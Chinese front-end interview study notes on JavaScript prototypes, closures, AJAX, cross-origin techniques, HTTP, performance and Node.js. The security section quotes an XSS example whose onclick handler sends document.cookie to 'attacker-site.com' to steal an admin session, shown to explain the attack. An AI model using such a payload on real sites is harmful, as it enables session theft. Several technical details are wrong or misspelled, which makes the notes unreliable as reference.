# 本文是我室友面试准备过程中所整理出来的内容，感谢室友的贡献。
## 盒子模型
```
IE box-sizing = border-box;
margin,border,padding,content
```
## 原型链及其缺点
缺点是实例可以改变原型中引用类型的值。
```
var Person = function() {
    this.walk = function() {
      console.log('walk');
    }
}

var vagor = {};
vagor.prototype = Object.create(Person.prototype);======vagor.__proto__ = Person.prototype;
Person.call(vagor);

或者var vagor ＝ new Person();

var Person = function(name) {
    this.name = name;
    this.walk = function() {
        console.log('walk');
    }
}
var Student = function(name, className) {
    this.className = className;
    Person.call(this, name);
}
Student.prototype = Object.create(Person.prototype);

var vagor = new Student("Vagor", "1305")
Person（类）-->Student（类）-->vagor（实例）
```
## 项目中遇到的问题（答问题，解决方案，解决后学到了什么）
- box-sizing & calc 的替代
- 小图标absolute的用法
- innerHTML和appendChild
- 完全改写prototype，实例无法访问prototype的问题。——指针与堆 引用类型和基本类型
- 事件代理模式，.on/addEventListener
- childNodes和children
- js 访问对象属性：.key 和 [key] 的区别
- 跨域JSONP、CORS
- 闭包:无论如何都输出5
```
for (var i = 0, l = 6; i < l; i++) {
    links[i].onclick = function (e) {
        e.preventDefault();
        alert("You click link #" + i);
    }       
}
```

## 异步加载
回调函数、事件监听、发布/订阅、Promise 对象

## 前端工程化
bower/grunt/git/chrome/sublime/karma前端自动化测试工具

## 自己写代码提高效率的方式
sublime／web storm／bower／git／擅长使用chrome（$0,自带jq选择器功能）
zen-coding／快捷键

## ajax的使用
```
var xhr = new XmlHttpRequest();
xhr.open('post',url,true)//方式；路径；同步or异步
xhr.onreadystatechange = function() {
  if (xhr.readystatus == 4 ) {
    if (xhr.status == 200) {
      //do something
    }
  }
}
xhr.send(data)
```

## apply和call
call 和 apply 都是为了改变某个函数运行时的 context 即上下文而存在的，换句话说，就是为了改变函数体内部 this 的指向。因为 JavaScript 的函数存在「定义时上下文」和「运行时上下文」以及「上下文是可以改变的」这样的概念。
apply传数据参数，call传单个参数

## HTTP
HTTP是TCP/IP网络模型中处于应用层的一个通信协议
谈及状态码,响应头／请求头等等   
```
request
Accept
Accept-Encoding
Accept-Language
cache-control
connection
user-agent
response
age
access-control-allow-origin
e-tag
cache-control
Expires
Server
```
## js跨域问题
```
CORS  （修改XHR的header中的url为绝对路径，后台设置Access-Control-Allow-Origin）
jsonp   （ json with padding）  前后端合作，前台通过script标签向后台get传callback函数名，后台输出一段文字，callback(data)
document.domain 浏览器不同的iframe之间
```
## 网页性能优化
**代码**
- 用简短的css选择器，多用class 重用性高
- css3动画 硬件加速
- 代码合并成一个文件
- 代码本身的优化
- 代码压缩工具Gzip
- 正文dom放上面
- css放上面，用link而不是@import
- js放下面
- 用函数声明的方式（而不是函数表达式）定义函数；因为会两次解析函数表达式
- 高复用低耦合，这样文件小，好维护，而且好扩展。

**图片**
- 特殊背景图展开
- 图片尺寸把握
- 相较于gif，最好用png8
- 图片压缩
- 雪碧图，减少http请求

**综合技术**
- lazy load
- cdn代码托管
- 七牛云图片托管

**服务器端**
- 特殊文件（logo）缓存时效的设置
- cache-control
- 减小cookie体积

## 网页加载不出问题
1. 进console
2. http status
3. chrome-debuger

## 网络安全方面的知识
- sql注入
- DDoS攻击
- xss
在GET时：index.php?name=guest<script>alert('attacked')</script>
<a href=# onclick=\"document.location=\'http://attacker-site.com/xss.php?c=\'+escape\(document.cookie\)\;\">bangerlee</a>。攻击者提交了条带<a>标签的数据，该条数据将保存在数据库中，而当 admin 用户登入时，包含 "bangerlee" 的用户列表将显示，如果 admin 用户点击 "bangerlee" 时，在 "attacker-site.com" 所在的服务器上，攻击者就可以窃取到 admin 的session-id。

## 输入URL之后发生了什么
- 物理层
- 网际层DNS解析，ip寻址
- 传输层TCP三次握手
- 应用层HTTP请求
- 后台：负载均衡，服务器解析请求
- 交给后台语言
- HTTP响应
- 根据状态码产生分支：304重定向找本地缓存或200成功
- html先加载，加载完成后渲染DOM tree；然后是重定向的内容，然后是data的内容，然后是css，加载完成后渲染render tree；最后加载js。

## Node.JS的优势与劣势
对于单线程的Node.js，我们可以通过回调的方式，实现异步编程，达到非阻塞的效果。
**Node.js优点：**

1. 采用事件驱动、异步编程，为网络服务而设计。其实Javascript的匿名函数和闭包特性非常适合事件驱动、异步编程。而且JavaScript也简单易学，很多前端设计人员可以很快上手做后端设计。
2. Node.js非阻塞模式的IO处理给Node.js带来在相对低系统资源耗用下的高性能与出众的负载能力，非常适合用作依赖其它IO资源的中间层服务。
3. Node.js轻量高效，可以认为是数据密集型分布式部署环境下的实时应用系统的完美解决方案。Node非常适合如下情况：在响应客户端之前，您预计可能有很高的流量，但所需的服务器端逻辑和处理不一定很多。

**Node.js缺点：**
1. 可靠性低
2. 单进程，单线程，只支持单核CPU，不能充分的利用多核CPU服务器。一旦这个进程崩掉，那么整个web服务就崩掉了。

## WebSocket
比http通信方式效率更高，不用一直创建TCP请求；
注意区分http1的keep-alive;
服务器端可以被动地传消息过来。

## TCP/IP四层模型
物理层——网际层——传输层——应用层

## 数据结构
- 两个栈实现一个队列
- KMP算法
- 遍历二叉树
- 哈夫曼树
- 哈希表
- 冒泡/希尔/快速/堆排序

## ES6&promise
- proxy（改变原函数功能）/promise/class/module/字符串、正则、数值、数组、对象的拓展/对异步操作的扩展
- argument.callee 指向当前函数本身，解除耦合
- argument.callee.caller 指向当前函数被引用函数的本身，解除更深层的耦合   严格模式下都不让用

## 设计模式
构造函数模式，原型模式，单例模式（实现通信）；观察者模式（事件监听）


## 兼容性问题
- IE6不支持display:inline-block;position:fixed;
- 现代浏览器：rem安卓微信不支持。
- attachEvent/detachEvent
- 闭包指的是innerFn
    ```
        function outerFn() {
            document.write("Outer function<br/>");
            function innerFn() {
                document.write("Inner function<br/>");
            }
            return innerFn;
        }
        var fnRef = outerFn();
        fnRef();
        ```
只要存在调用内部函数的可能，JavaScript就需要保留被引用的函数。而且JavaScript运行时需要跟踪引用这个内部函数的所有变量，直到最后一个变量废弃，JavaScript的垃圾收集器才能释放相应的内存空间。
setTimeout()无法传递类似于带参数的函数，所以用返回函数的形式传递带参数的函数
封装一个对象

## json与xml的优缺点
文件大小 成熟度

## 清除浮动有哪些方法


```
clear fix{clear:both;}
:after{*zoom:1}
#container {overflow:auto;zoom:1;}
```

## json和jsonp的区别，说说同源策略？
同协议，同域名和同端口。
比如一个黑客程序，他利用IFrame把真正的银行登录页面嵌到他的页面上，当你使用真实的用户名，密码登录时，他的页面就可以通过Javascript读取到你的表单中input中的内容，这样用户名，密码就轻松到手了。

## 实现一个轮播图效果
css translateX
js 最后一张图后面接着第一张图

## seo
语意化标签
重要内容html放前面
链接加上title属性
